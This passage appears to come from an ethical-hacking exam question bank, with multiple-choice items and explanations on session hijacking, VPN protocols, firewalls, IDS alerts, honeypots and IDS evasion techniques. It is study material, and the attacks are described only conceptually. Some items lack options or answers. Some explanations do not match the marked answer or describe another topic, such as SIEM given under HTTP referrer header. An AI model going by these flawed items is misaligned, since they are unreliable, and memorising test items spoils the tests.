> + Session Fixation: The attacker performs a session fixation attack to hijack a valid user session. The attacker takes advantage of limitations in web-application session ID management. Web applications allow the user to authenticate themselves using an existing session ID, instead of generating a new session ID. In this type of attack, the attacker provides a legitimate web-application session ID and lures the victim to use it.

740. In order to hijack TCP traffic, an attacker has to understand the next sequence and the acknowledge number that the remote computer expects. Explain how the sequence and acknowledgment numbers are incremented during the 3-way handshake process.

+ [x] Sequence and acknowledgment numbers are incremented by one during the 3-way handshake process
+ [ ] Sequence and acknowledgment numbers are incremented by two during the 3-way handshake process
+ [ ] Sequence number is not incremented and acknowledgment number is incremented by one during the 3-way handshake process
> **Explanation:**
> During the 3-way handshake, sequence and acknowledgment numbers are (relatively) incremented by one. After that acknowledge number will be incremented for the size of the packet received.

+ [ ] IP spoofing
+ [x] TCP/IP hijacking
> **Explanation:**
> In TCP/IP hijacking, an attacker intercepts an established connection between two communicating parties using spoofed packets, and then pretends to be one of them. In this approach, the attacker uses spoofed packets to redirect the TCP traffic to his/her own machine. Once this is successful, the victim’s connection hangs and the attacker is able to communicate with the host’s machine on behalf of the victim.

744. Out of the following, which network-level session hijacking technique is useful in gaining unauthorized access to a target computer with the help of a trusted host’s IP address?
+ [ ] UDP Hijacking
+ [ ] TCP/IP Hijacking
+ [x] IP Spoofing: Source Routed Packets
+ [ ] Bling Hijacking
> **Explanation:**
> The source-routed packets technique is useful in gaining unauthorized access to a computer with the help of a trusted host’s IP address. This type of hijacking allows attackers to create their own acceptable packets to insert into the TCP session. First, the attacker spoofs the trusted host’s IP address so that the server managing a session with the host accepts the packets from the attacker. The packets are source-routed, so the sender specifies the path for packets from the source to the destination IP. Using this source-routing technique, attackers can fool the server into thinking that it is communicating with the user.

745. Which of the following tools can be used to perform RST hijacking on a network?
+ [x] Colasoft’s Packet Builder
+ [ ] Nmap
+ [ ] Recon-ng
+ [ ] FOCA
> **Explanation:**
> RST hijacking involves injecting an authentic-looking reset (RST) packet using spoofed source address and predicting the acknowledgment number. The hacker can reset the victim’s connection if it uses an accurate acknowledgment number. The victim believes that the source has sent the reset packet and resets the connection. RST Hijacking can be carried out using a packet crafting tool such as Colasoft’s Packet Builder and TCP/IP analysis tool such as tcpdump.

746. Out of the following, which network-level session hijacking technique can be used to inject malicious data or commands into the intercepted communications in a TCP session?
+ [ ] TCP/IP hijacking
+ [ ] RST hijacking
+ [x] Blind hijacking
+ [ ] UDP hijacking
> **Explanation:**
> + In blind hijacking, a hacker can inject malicious data or commands into the intercepted communications in a TCP session, even if the victim disables source routing. Here, an attacker correctly guesses the next ISN of a computer attempting to establish a connection; the attacker sends malicious data or a command, such as password setting to allow access from another location on the network, but the attacker can never see the response. To be able to see the response, a man-in-the-middle attack works much better.
> + In TCP/IP hijacking, an attacker intercepts an established connection between two communicating parties using spoofed packets, and then pretends to be one of them. In this approach, the attacker uses spoofed packets to redirect the TCP traffic to his/her own machine. Once this is successful, the victim's connection hangs and the attacker is able to communicate with the host’s machine on behalf of the victim.

747. Which of the following protocols is an extension of IP to send error messages? An attacker can use it to send messages to fool the client and the server.
+ [ ] ARP
+ [ ] FTP
+ [ ] SSL
+ [x] ICMP
> **Explanation:**
> ICMP (Internet control message protocol) is an extension of IP to send error messages and an attacker can use it to send messages to fool the client and the server. The technique used is to forge ICMP (Internet control message protocol) packets to redirect traffic between the client and the host through the hijacker’s host. The hacker’s packets send error messages, indicating problems in processing packets through the original connection. This fools the server and client into routing through hijacker’s path instead.

764. Which of the following technique allows users to authenticate web servers?
+ [ ] SFTP
+ [ ] SSH
+ [ ] HTTPS
+ [x] HPKP
> **Explanation:**
> + The correct answer is “b,” HTTP Public Key Pinning ([HPKP](https://developer.mozilla.org/en-US/docs/Glossary/HPKP)) is a security feature that tells a web client to associate a specific cryptographic public key with a certain web server to decrease the risk of [MITM](https://developer.mozilla.org/en-US/docs/Glossary/MITM) attacks with forged certificates. Using HTTP Public Key Pinning (HPKP) allows users authenticate web servers.
> + HTTPS: HTTPS is the secure version of HTTP, the protocol over which data is sent between a browser and a website.
> + SSH: SSH is a network protocol used to remotely access and manage a device.
> + SFTP: SFTP is a separate protocol packaged with SSH that works in a similar way over a secure connection.

765. Which of the following protocols is used to implement virtual private networks (VPNs)?
+ [ ] Token binding
+ [ ] HTTPS
+ [x] IPsec
+ [ ] HPKP
> **Explanation:**
> Internet protocol security (IPsec) supports the secure exchange of packets at the IP layer. It ensures interoperable cryptographically based security for IP protocols (IPv4 and IPv6), and supports network-level peer authentication, data origin authentication, data integrity, data confidentiality (encryption), and replay protection. It is widely used to implement virtual private networks (VPNs) and for remote user access through dial-up connection to private networks. It supports transport and tunnel encryption modes, though sending and receiving devices must share a public key.

766. Which protocol defines the payload formats, types of exchange, and naming conventions for security information such as cryptographic algorithm or security policies. Identify from the following options.
+ [ ] ISAKMP
+ [ ] AH
+ [ ] ESP
+ [x] DOI
> **Explanation:**
> IPsec DOI instantiates ISAKMP for use with IP when IP uses ISAKMP to negotiate security associations. A DOI document defines many things: a naming scheme for DOI-specific protocol identifiers, the contents of the situation field of the ISAKMP SA payload, the attributes that IKE negotiates in a quick mode, and any specific characteristics that IKE needs to convey.

767. Which of the following tools can be used by a pentester to test the security of web applications?

773. Which of the following techniques protects the client–server communication against session hijacking attacks by creating a public–private key pair for every connection to a remote server?
+ [ ] HTTP Public Key Pinning (HPKP)
+ [ ] HTTP Strict Transport Security (HSTS)
+ [x] Token binding
+ [ ] WEP/WPA encryption
> **Explanation:**
> + HTTP Strict Transport Security (HSTS): HTTP Strict Transport Security (HSTS) is a web security policy that protects HTTPS websites against MITM attacks. The HSTS policy helps web servers force web browsers to interact with them using HTTPS. With the HSTS policy, all insecure HTTP connections are automatically converted into HTTPS connections. This policy ensures that all the communication between a web server and web browser is encrypted and that all responses that are delivered and received originate from an authenticated server.
> + HTTP Public Key Pinning (HPKP): HTTP Public Key Pinning (HPKP) is a trust on first use (TOFU) technique used in an HTTP header that allows a web client to associate a specific public key certificate with a particular server to minimize the risk of MITM attacks based on fraudulent certificates. In TLS sessions, to verify the authenticity of a server’s public key, the public key is enclosed in an X.509 digital certificate, which is signed by a certification authority (CA).
> + WEP/WPA Encryption: Wired Equivalent Privacy (WEP) and Wireless Protected Access (WPA) are wireless protocols that are intended to protect the traffic that is sent and received by users over a wireless network. The implementation of these protocols can thwart the attempts of unwanted users to connect to the network. A weak encryption mechanism enables attackers to brute force credentials and enter the target network to perform an MITM attack.
> + **Token Binding**: When a user logs into a web application, a cookie with a session ID, called a token, is generated. The user utilizes this random token to send requests to the server and access resources. An attacker can impersonate the user and hijack the connection by capturing and reusing a valid session ID. Token binding protects client–server communication against session hijacking attacks. The client creates a public–private key pair for every connection to a remote server.

774. A security engineer has been asked to deploy a secure remote access solution that will allow employees to connect to the company’s internal network. Which of the following can be implemented to minimize the opportunity for a man-in-the-middle attack to occur?
+ [ ] Mutual authentication
+ [x] IPSec
+ [ ] Static IP addresses
+ [ ] SSL
> **Explanation:**
> IPSec is a protocol suite developed by the IETF for securing IP communications by authenticating and encrypting each IP packet of a communication session. It is deployed widely to implement virtual private networks (VPNs) and for remote user access through dial-up connection to private networks.

775. A user wants to securely establish a remote connection to a system without any interference from perpetrators. Which of the following methods should he incorporate in order to do so?
+ [ ] SMB Signing
+ [ ] HTTPS
+ [ ] SFTP
+ [x] VPN
> **Explanation:**
> He should be implementing encrypted VPN such as PPTP, L2PT, IPSec, etc. as a remote connection prevents session hijacking.

776. Which of the following security services is useful in providing connectionless integrity and data origin authentication for IP datagrams as well as anti-replay protection for the data payload and some portions of the IP header of each packet.
+ [ ] Encapsulation Security Payload (ESP)
+ [x] Authentication Header (AH)
+ [ ] Token binding
+ [ ] HTTP Public Key Pinning (HPKP)
> **Explanation:**
> 

777. OpenSSH or SSH is a more secure solution to which of the following protocol?
+ [ ] IP
+ [x] Telnet, rlogin
+ [ ] SMB
+ [ ] HTTP
> **Explanation:**
> OpenSSH or SSH is a more secure solution to Telnet, rlogin. SSH sends encrypted data and makes it difficult for the attacker to send the correctly encrypted data if a session is hijacked.

778. Which of the following security measures constitutes a set of standardized user pre-verification procedures that requires all users (inside or outside) to be authenticated before providing access to any resource?
+ [ ] Compensating controls
+ [x] Zero-trust principle
+ [ ] WEP/WPA encryption
+ [ ] HTTP referrer header
> **Explanation:**
> + Compensating Controls: These controls are used as an alternative control when the intended controls fail or cannot be used. They do not prevent any attack attempt but try to restore using other means like restoring from backup. Examples include hot site, backup power system, etc.
> + **Zero-trust Principle:** Zero-trust principles constitute a set of standardized user pre-verification procedures that requires all users (inside or outside) to be authenticated before providing access to any resource.
> + WEP/WPA Wired Equivalent Privacy (WEP) and Wireless Protected Access (WPA) are wireless protocols that are intended to protect the traffic that is sent and received by users over a wireless network. The implementation of these protocols can thwart the attempts of unwanted users to connect to the network. A weak encryption mechanism enables attackers to brute force credentials and enter the target network to perform an MITM attack.
> + HTTP Referrer Header**:** Security incident and event management (SIEM) is also known as security information and event management which performs real-time security operations center (SOC) functions like identifying, monitoring, recording, auditing, and analyzing security incidents.

## IDS, IPS, Firewall, and Honeypot Concepts
779. Which of the following methods detects an intrusion based on the fixed behavioral characteristics of the users and components of a computer system?
+ [ ] Signature recognition
+ [ ] Protocol anomaly detection
+ [ ] Bastion host
+ [x] Anomaly detection
> **Explanation:**
> + Signature Recognition: Signature recognition, also known as misuse detection, tries to identify events that indicate an abuse of a system or network resource
> + Protocol Anomaly Detection: In this type of detection, models are built to explore anomalies in the way in which vendors deploy the TCP/IP specification
> + **Anomaly Detection**: It detects the intrusion based on the fixed behavioral characteristics of the users and components in a computer system
> + Bastion Host: The bastion host is designed for defending the network against attacks. It acts as a mediator between inside and outside networks. A bastion host is a computer system designed and configured to protect network resources from attacks. Traffic entering or leaving the network passes through the firewall

780. The general indicators of which of the following types of intrusions are repeated login attempts from remote hosts, a sudden influx of log data, and a sudden increase in bandwidth consumption?
+ [x] Network intrusion
+ [ ] Signature recognition
+ [ ] System intrusion
+ [ ] File-system intrusion
> **Explanation:**
> File System Intrusions: By observing system files, the presence of an intrusion can be identified. System files record the activities of the system.
> + If you find new, unknown files/programs on your system. Unexplained modifications in file size are also an indication of an attack.
> + You can identify unfamiliar file names in directories, including executable files with strange extensions and double extensions.

> Signature recognition: It is an IDS intrusion detection method, also known as misuse detection, tries to identify events that indicate an abuse of a system or network resource

781. Which of the following elements in the firewall architecture is a computer system designed and configured to protect network resources from attacks and acts as a mediator between inside and outside networks?
+ [x] Bastion host
+ [ ] Demilitarized zone
+ [ ] Screened subnet
+ [ ] Multi-homed firewall
> **Explanation:**
> + Screened subnet: A screened subnet (DMZ) is a protected network created with a two- or three-homed firewall behind a screening firewall, and it is a term that is commonly used to refer to the DMZ. When using a three-homed firewall, connect the first interface to the Internet, the second to the DMZ, and the third to the intranet. The DMZ responds to public requests and has no hosts accessed by the private network. Internet users cannot access the private zone.
> + Multi-homed firewall: A multi-homed firewall is a node with multiple NICs that connects to two or more networks. It connects each interface to separate network segments logically and physically. A multi-homed firewall helps in increasing the efficiency and reliability of an IP network. The multi-homed firewall has more than three interfaces that allow for further subdividing the systems based on the specific security objectives of the organization
> + Demilitarized Zone (DMZ): In computer networks, the demilitarized zone (DMZ) is an area that hosts computer(s) or a small sub-network placed as a neutral zone between a particular company’s internal network and an untrusted external network to prevent outsider access to a company’s private data. The DMZ serves as a buffer between the secure internal network and the insecure Internet, as it adds a layer of security to the corporate LAN, thus preventing direct access to other parts of the network.
> + **Bastion Host:** The bastion host is designed for defending the network against attacks. It acts as a mediator between inside and outside networks. A bastion host is a computer system designed and configured to protect network resources from attacks. Traffic entering or leaving the network passes through the firewall.

782. Which of the following indicators falls in the category of general indications of system intrusion?
+ [x] Missing logs or logs with incorrect permissions or ownership
+ [ ] Repeated login attempts from remote hosts
+ [ ] Missing files
+ [ ] Repeated probes of the available services on machines
> **Explanation:**
> **Indications of file system intrusions:**
> + If you find new, unknown files/programs on your system, then there is a possibility that the system has been intruded into. The system can be compromised to the extent that it can, in turn, compromise other network systems.
> + When an intruder gains access to a system, he or she tries to escalate privileges to gain administrative access. When the intruder obtains administrator privileges, he/she could change file permissions, for example, from read-only to write.
> + Unexplained modifications in file size are also an indication of an attack. Make sure you analyze all your system files.
> + The presence of rogue suid and sgid files on your Linux system that do not match your master list of suid and sgid files could indicate an attack.
> + You can identify unfamiliar file names in directories, including executable files with strange extensions and double extensions.
> + Missing files are also a sign of a probable intrusion/attack.
> 
> **Indications of network intrusions:**
> + A sudden increase in bandwidth consumption
> + Repeated probes of the available services on your machines
> + Connection requests from IPs other than those in the network range, which imply that an unauthenticated user (intruder) is attempting to connect to the network
> + Repeated login attempts from remote hosts

> 
> **Indications of system intrusions:**
> + Sudden changes in logs such as short or incomplete logs
> + Unusually slow system performance
>

783. Which of the following attributes in a packet can be used to check whether the packet originated from an unreliable zone?
+ [ ] Direction
+ [x] Interface
+ [ ] TCP flag bits
+ [ ] Source IP address
> **Explanation:**
> Traditional packet filters make this decision according to the following information in a packet:
> + Direction: Used to check whether the packet is entering or leaving the private network.
> + **Interface**: Used to check whether the packet is coming from an unreliable zone.
> + TCP flag bits: Used to check whether the packet has SYN, ACK, or other bits set for the connection to be made.
> + Source IP address: Used to check whether the packet is coming from a valid source. The information about the source IP address can found from the IP header of the packet.

784. Which of the following honeypots is simulated with known vulnerabilities, such as outdated APIs and vulnerable SMBv1 protocols, and emulates different Trojans, viruses, and backdoors that encourage adversaries to perform exploitation activities?
+ [ ] Spam honeypots
+ [ ] Email honeypots
+ [ ] Database honeypots
+ [x] Malware honeypots
> **Explanation:**
> + Database Honeypots: Database honeypots employ fake databases that are vulnerable to perform database-related attacks such as SQL injection and database enumeration. These fake databases trick the attackers by making them think that these databases contain crucial sensitive information such as credit card details of all the customers and employee databases
> + Spam Honeypots: Spam honeypots specifically target spammers who abuse vulnerable resources such as open mail relays and open proxies. Basically, spam honeypots consist of mail servers that deliberately accept emails from any random source from the Internet. They provide crucial information about spammers and their activities
> + **Malware Honeypots**: Malware honeypots are used to trap malware campaigns or malware attempts over the network infrastructure. These honeypots are simulated with known vulnerabilities such as outdated APIs, vulnerable SMBv1 protocols, etc., and they also emulate different Trojans, viruses, and backdoors that encourage adversaries to perform exploitation activities.
> + Email Honeypots: Email honeypots are also called email traps. They are nothing but fake email addresses that are specifically used to attract fake and malicious emails from adversaries. These fake email IDs will be distributed across the open Internet and dark web to lure threat actors into performing various malicious activities to exploit the organization

785. What is the main advantage that a network-based IDS/IPS system has over a host-based solution?
+ [x] They do not use host system resources
+ [ ] They will not interfere with user interfaces
+ [ ] They are easier to install and configure
+ [ ] They are placed at the boundary, allowing them to inspect all traffic
> **Explanation:**
> + The correct option is “They do not use host system resources”.
> + Host-based intrusion detection systems (IDSes) protect just that: the host or endpoint. This includes workstations, servers, mobile devices and the like. Host-based IDSes are not just one of the last layers of defense, but they're also one of the best security controls because they can be fine-tuned to the specific workstation, application, user role or workflows required. A network-based IDS often sits on the ingress or egress point(s) of the network to monitor what's coming and going. Given that a network-based IDS sits further out on the network, so it doesn't use any host system resources and it may not provide enough granular protection to keep everything in check -- especially for network traffic that's protected by SSL, TLS or SSH.

786. While conducting a penetration test, the tester determines that there is a firewall between the tester’s machine and the target machine. The firewall is only monitoring TCP handshaking of packets at the session layer of the OSI model. Which type of firewall is the tester trying to traverse?
+ [ ] Application-level firewall
+ [ ] Packet filtering firewall
+ [ ] Stateful multilayer inspection firewall
+ [x] Circuit-level gateway firewall
> **Explanation:**
> + Packet filtering firewall: A packet filtering firewall investigates each individual packet passing through it and makes a decision whether to pass the packet or drop it. It works at the Internet protocol (IP) layer of the TCP/IP model. Packet filter–based firewalls concentrate on individual packets, analyze their header information, and determine which way they need to be directed.
> + Application-level firewall: Application-based proxy firewalls concentrate on the application layer rather than just the packets. The need for application-level firewall arises when huge amount of voice, video, and collaborative traffic are accessed at data-link layer and network layer utilized for unauthorized access to internal and external networks.
> + Stateful multilayer inspection firewall: They filter packets at the network layer, to determine whether session packets are legitimate, and evaluate the contents of packets at the application layer.
> + With the use of stateful packet filtering, you can overcome the limitation of packet firewalls that can only filter on IP address, port, protocol, and so on. This multilayer firewall can perform deep packet inspection.

787. Which type of intrusion detection system can monitor and alert on attacks, but cannot stop them?
+ [ ] Intuitive
+ [ ] Reactive
+ [x] Passive
+ [ ] Detective
> **Explanation:**
> Passive application-level firewalls: They work similar to an IDS, in that they also check all incoming requests against known vulnerabilities, but they do not actively reject or deny those requests if a potential attack is discovered.

788. An advantage of an application-level firewall is the ability to
+ [ ] Filter packets at the network level
+ [ ] Retain state information for each packet
+ [ ] Monitor TCP handshaking
+ [x] Filter specific commands, such as http:post
> **Explanation:**
> + An application-level firewall is a firewall that controls input, output, and/or access across an application or service. It monitors and possibly blocks the input, output, or system service calls, which do not meet the policy of the firewall. Before allowing the connection, it evaluates the network packets for valid data at the application layer of the firewall. The client and server communication does not happen directly, but happens only through a proxy server. This server acts as a gateway for two-side communications and drops the data packets working against the firewall’s rules.
> + Application-level gateways, also called proxies, concentrate on the application layer rather than just the packets.
> + They perform packet filtering at the application layer and make decisions about whether to transmit the packets.
> + A proxy-based firewall asks for authentication to pass the packets as it works at the application layer.
> + Incoming or outgoing packets cannot access services for which there is no proxy. In simple terms, design of an application-level gateway helps it to act as a web proxy and drop packets such as FTP, gopher, Telnet, or any other traffic that should not be allowed to pass through.
> + As packet filtering is performed at the application level, they are able to filter application-specific commands such as GET or POST requests.
> + A content caching proxy optimizes performance by caching frequently accessed information instead of sending new requests for repetitive data transfers to the servers.

789. Jamie has purchased and deployed an application firewall to protect his company infrastructure which includes various email servers, file server shares, and applications. Also, all the systems in his company share the same onsite physical datacenter. Jamie has positioned the newly purchased firewall nearest to the application systems so as to protect the applications from attackers. This positioning does not protect the complete network.
	What can be done to address the security issues by this deployment for Jamie?
+ [ ] Jamie will need to add at least three additional firewalls at the untrusted network, router side, and application side
+ [x] Jamie will need to add at least one additional firewall at the network edge
+ [ ] Jamie will need to replace the application firewall with a packet filtering firewall at the network edge
+ [ ] Jamie will need to add at least three additional firewalls at the DMZ, internet, and intranet
> **Explanation:**
> The test taker needs to understand that only the application server is being protected while the rest of the traffic is allowed to enter the network without a firewall. The test taker will have to understand that adding an additional firewall is better than having only the perimeter firewall. The test taker will also have to understand that placing three firewalls might be better; however, there is not enough detail to know where the router is in the scenario. They might choose this distractor because it has more firewalls.

790. Jamie was asked by their director to make new additions to the firewall in order to allow traffic for a new software package. After the firewall changes, Jamie receives calls from users that they cannot access other services, such as email and file shares, that they were able to access earlier.
	What was the problem in the latest changes that is denying existing users from accessing network resources?
+ [ ] Jamie should exit privileged mode to allow the settings to be effective
+ [ ] Jamie needs to restart the firewall to make the changes effective
+ [x] Jamie’s additional entries were processed first
+ [ ] Jamie needs to have the users restart their computers in order to make settings effective
> **Explanation:**
> Jamie has typed the new changes at the top of the existing access control list and included an explicit deny statement (deny any any) at the end of their new entries. Since the firewall interprets each new line in order, when the firewall reaches the end of the new entries at the top, it stops allowing all traffic. Jamie should have added the new additions at the bottom just before the existing deny any any instead of adding an additional deny any any. The test taker needs to know that what is meant by processed first is that there was an accidental additional deny any any added just below the new lines but just above the original previously existing entries.

791. Teyla is a security analyst for BAYARA Company. She is responsible for the firewall, antivirus, IPS, and web filtering security controls. She wants to protect the employees from a new phishing attack.  
	What should Teyla do?
+ [x] Use the web filtering application to prevent the employees from accessing the phishing webpage
+ [ ] Block the phishing via antivirus
+ [ ] Use IPS to block phishing
+ [ ] Block outbound traffic to the ports 80 and 443 in the firewall
> **Explanation:**
> All the security controls work best for a specific threat. In the example, the phishing threat is better solved with the web filtering control.

792. When analyzing the IDS logs, the system administrator notices connections from outside of the LAN have been sending packets where the source IP address and destination IP address are the same. However, no alerts have been sent via email or logged in the IDS. Which type of an alert is this?
+ [ ] True negative
+ [x] False negative
+ [ ] False positive
+ [ ] True positive
> **Explanation:**
> + False Positive (No attack - Alert): A false positive occurs if an event triggers an alarm when no actual attack is in progress. A false positive occurs when an IDS treats regular system activity as an attack. False positives tend to make users insensitive to alarms and reduce their reactions to actual intrusion events. While testing the configuration of an IDS, administrators use false positives to determine if the IDS can distinguish between false positives and real attacks or not.
> + **False Negative** (Attack - No Alert): A false negative is a condition occurred when an IDS fails to react to an actual attack event. This event is the most dangerous failure since the purpose of an IDS is to detect and respond to attacks.
> + True Positive (Attack - Alert): A true positive is a condition occurring when an event triggers an alarm and causes the IDS to react as if a real attack is in progress. The event may be an actual attack, in which case an attacker is making an attempt to compromise the network, or it may be a drill, in which case security personnel are using hacker tools to conduct tests of a network segment.
> + True Negative (No attack - No Alert): A true negative is a condition occurred when an IDS identifies an activity as acceptable behavior and the activity is acceptable. A true negative is successfully ignoring the acceptable behavior. It is not harmful as the IDS is performing as expected.

793. When analyzing the IDS logs, the system administrator noticed an alert was logged when the external router was accessed from the administrator’s computer to update the router configuration. What type of an alert is this?
+ [x] False-positive
+ [ ] False-negative
+ [ ] True-positive
+ [ ] True-negative
> **Explanation:**
> In a false-positive alarm an IDS raises an alarm on a nonmalicious event. As false-positive alarm triggers during unjustified alerts, they cause chaos in the organization. They nullify the urgency and the value of the real alerts, leading to ignoring the actual alarm situation.

> Causes of false-positive alarm:
> 1.  A network traffic false alarm: A network traffic false alarm triggers when a nonmalicious traffic event occurs. A great example of this would be an IDS triggers an alarm when the packets do not reach the destination due to network device failure.
> 2.  A network device alarm: An IDS triggers a network device alarm when the device generates unknown or odd packets, for example, load balancer.
> 3.  An Alarm caused by an incorrect software script: If poorly written software generates odd or unknown packets, IDS will trigger a false-positive alarm.
> 4.  Alarms caused by an IDS bug: A software bug in an IDS will raise an alarm for no reason.

794. Which of the following types of firewall inspects only header information in network traffic?
+ [x] Packet filter
+ [ ] Application-level gateway
+ [ ] Circuit-level gateway
+ [ ] Stateful inspection
> **Explanation:**
> Stateful inspection firewall filter packets at the network layer to determine whether session packets are legitimate, and they overcome the limitation of packet firewalls that can only filter on IP address, port, and protocol, and so on by performing deep packet inspection. Circuit-level gateway forwards data between networks without verifying it, and blocks incoming packets into the host, but allows the traffic to pass through itself. Application-level gateway inspects, finds, and verifies malicious traffic missed by stateful inspection firewalls, decides whether to allow access, and improves the overall security of the application layer.

795. Which of the statements concerning proxy firewalls is correct?
+ [ ] Firewall proxy servers decentralize all activity for an application
+ [x] Computers establish a connection with a proxy firewall that initiates a new network connection for the client
+ [ ] Proxy firewalls block network packets from passing to and from a protected network
+ [ ] Proxy firewalls increase the speed and functionality of a network
> **Explanation:**
> Proxy firewalls serve a role similar to stateful firewalls. The proxy then initiates a new network connection on behalf of the request. This provides significant security benefits because it prevents any direct connections between systems on either side of the firewall.

796. Which solution can be used to emulate computer services, such as mail and ftp, and to capture information related to logins or actions?

797. Sean who works as a network administrator has just deployed an IDS in his organization’s network. Sean deployed an IDS that generates four types of alerts that include: true positive, false positive, false negative, and true negative.
	In which of the following conditions does the IDS generate a true positive alert?
+ [ ] A true positive is a condition occurring when an event triggers an alarm when no actual attack is in progress
+ [x] A true positive is a condition occurring when an event triggers an alarm and causes the IDS to react as if a real attack is in progress
+ [ ] A true positive is a condition occurring when an IDS identifies an activity as acceptable behavior and the activity is acceptable
+ [ ] A true positive is a condition occurring when an IDS fails to react to an actual attack event
> **Explanation:**
> True positive (attack – alert): A true positive is a condition occurring when an event triggers an alarm and causes the IDS to react as if a real attack is in progress. The event may be an actual attack, in which case an attacker is making an attempt to compromise the network, or it may be a drill, in which case security personnel is using hacker tools to conduct tests of a network segment.

798. Which of the following indicator identifies a network intrusion?
+ [ ] Rare login attempts from remote hosts
+ [x] Repeated probes of the available services on your machines
+ [ ] Connection requests from IPs from those systems within the network range

> **Explanation:**
> Network Intrusions: General indications of network intrusions include:
> + Sudden increase in bandwidth consumption is an indication of intrusion
> + Repeated probes of the available services on your machines
> + Connection requests from IPs other than those in the network range, indicating that an unauthenticated user (intruder) is attempting to connect to the network
> + Repeated login attempts from remote hosts
> + A sudden influx of log data could indicate attempts at Denial-of-Service attacks, bandwidth consumption, and distributed Denial-of-Service attacks

799. At which two traffic layers do most commercial IDSes generate signatures? (Select Two)

> According to New 'semantics-aware' IDS reduces false positives ([New-semantics-aware-IDS-reduces-false-positives](https://searchsecurity.techtarget.com/news/1113940/New-semantics-aware-IDS-reduces-false-positives)), [computer-networks-questions-answers-entrance-exams](https://www.sanfoundry.com/computer-networks-questions-answers-entrance-exams/), and [Quiz-IDS-IPS](https://searchsecurity.techtarget.com/quiz/Quiz-IDS-IPS), the most commercial IDSes generate signatures at the network and transport layers.

800. Jamie needs to keep data safe in a large datacenter, which is in desperate need of a firewall replacement for the end of life firewall. The director has asked Jamie to select and deploy an appropriate firewall for the existing datacenter. The director indicates that the amount of throughput will increase over the next few years and this firewall will need to keep up with the demand while other security systems do their part with the passing data. What firewall will Jamie use to meet the requirements?
+ [ ] Packet filtering firewall because layer 7 inspections use less overhead, allowing more packets to be inspected per second than other firewall types
+ [ ] Application-level proxy firewall because the connection between internal and external systems are inspected but not broken; data moves more rapidly
+ [x] Packet filtering firewall because it will best keep the increased traffic moving at an acceptable level
+ [ ] Application-level proxy firewall because unlike the old packet filtering firewall technology, it can adjust speed based on applications
> **Explanation:**
> + Performance is the key focus of the question; therefore, the test taker will have to focus on the real need of the most enterprise businesses and not get distracted by other slower firewall types. Packet filtering firewall may seem old school to less experienced test takers and they may immediately choose other options.
> + Packet filtering firewalls are best performing of the choices.

801. A circuit-level gateway works at which of the following layers of the OSI model?
+ [ ] Layer 4 – Transport
+ [x] Layer 5 – Session
+ [ ] Layer 3 – Network
+ [ ] Layer 2 – Data Link
> **Explanation:**
> A circuit-level gateway firewall works at the session layer of the OSI model or TCP layer of TCP/IP. It forwards data between networks without verifying it, and blocks incoming packets into the host, but allows the traffic to pass through itself. Information passed to remote computers through a circuit-level gateway will appear to have originated from the gateway, as the incoming traffic carries the IP address of the proxy (circuit-level gateway).

806. When an alert rule is matched in a network-based IDS like snort, the IDS does which of the following:
+ [ ] Stops checking rules, sends an alert, and lets the packet continue
+ [x] Continues to evaluate the packet until all rules are checked
+ [ ] Drops the packet and moves on to the next one
+ [ ] Blocks the connection with the source IP address in the packet
> **Explanation:**
> Snort is an open-source network intrusion detection system capable of performing real-time traffic analysis and packet logging on IP networks. Snort uses the popular libpcap library (for UNIX/Linux) or Winpcap (for Windows), the same library that tcpdump uses to perform its packet sniffing. Attaching snort in promiscuous mode to the network media decodes all the packets passing through the network. It generates alerts according to the content of individual packets and rules defined in the configuration file. When an alert rule is matched in a network-based IDS like snort, the IDS continues to evaluate the packet until all rules are checked.

808. Manav wants to simulate a complete system and provide an appealing target to push hackers away from the production systems of his organization. By using some honeypot detection tool, he offers typical Internet services such as SMTP, FTP, POP3, HTTP, and TELNET, which appear perfectly normal to attackers. However, it is a trap for an attacker by messing them so that he leaves some traces knowing that they had connected to a decoy system that does none of the things it appears to do; but instead, it logs everything and notifies the appropriate people.

## Evading IDS
813. Which of the following is an IDS evasion technique used by an attacker to confuse the IDS by forcing it to read invalid packets as well as blindly trust and accept a packet that an end system rejects?
+ [ ] Fragmentation attack
+ [ ] Obfuscation
+ [x] Insertion attack
+ [ ] Invalid RST packets
> **Explanation:**
> + Invalid RST Packets**:** The TCP uses 16-bit checksums for error checking of the header and data and to ensure that communication is reliable. It adds a checksum to every transmitted segment that is checked at the receiving end. When a checksum differs from the checksum expected by the receiving host, the TCP drops the packet at the receiver's end. The TCP also uses an RST packet to end two-way communications. Attackers can use this feature to elude detection by sending RST packets with an invalid checksum.
> + Fragmentation attack**:** Fragmentation can be used as an attack vector when fragmentation timeouts vary between the IDS and the host. Through the process of fragmenting and reassembling, attackers can send malicious packets over the network to exploit and attack systems.
> + Obfuscating**:** It is an IDS evasion technique used by attackers to encode the attack packet payload in such a way that the destination host can only decode the packet but not the IDS. An attacker manipulates the path referenced in the signature to fool the HIDS. Using Unicode characters, an attacker can encode attack packets that the IDS would not recognize but which an IIS web server can decode
> + **Insertion Attack:** Insertion is the process by which the attacker confuses the IDS by forcing it to read invalid packets (i.e., the system may not accept the packet addressed to it). An IDS blindly trusts and accepts a packet that an end system rejects. If a packet is malformed or if it does not reach its actual destination, the packet is invalid. If the IDS reads an invalid packet, it gets confused. An attacker exploits this condition and inserts data into the IDS

814. One of the following is an IDS evasion technique used by an attacker to send a huge amount of unnecessary traffic to produce noise or fake traffic. If the IDS does not analyze the noise traffic, the true attack traffic goes undetected. Which is this IDS evasion technique?
+ [ ] Encryption
+ [ ] Overlapping fragments
+ [ ] Denial-of-service attack
+ [x] Flooding
> **Explanation:**
> + Encryption: Network-based intrusion detection analyzes traffic in the network from the source to the destination. If an attacker succeeds in establishing an encrypted session with his/her target host using a secure shell (SSH), secure socket layer (SSL), or virtual private network (VPN) tunnel, the IDS will not analyze the packets going through these encrypted communications. Thus, an attacker sends malicious traffic using such secure channels, thereby evading IDS security.
> + Overlapping Fragments**:** Attackers use overlapping fragments to evade IDS. In this technique, attackers generate a series of tiny fragments with overlapping TCP sequence numbers.
> + **Flooding:** To bypass IDS security, attackers flood IDS resources with noise or fake traffic to exhaust them with having to analyze flooded traffic. Once such attacks succeed, attackers send malicious traffic toward the target system behind the IDS, which offers little or no intervention. Thus, true attack traffic might go undetected
> + Denial-of-Service Attack (DoS): The attacker identifies a point of network processing that requires the allocation of a resource, causing a condition to occur in which all of that resource is consumed. The resources affected by the attacker are CPU cycles, memory, disk space, and network bandwidth. Attackers monitor and attack the CPU capabilities of the IDS. This is because the IDS needs half of a CPU cycle to read the packets, detect the purpose of their existence, and then compare them with some location in the saved network state. An attacker can verify the most computationally expensive network processing operations and then compel the IDS to spend all its time in carrying out useless work.

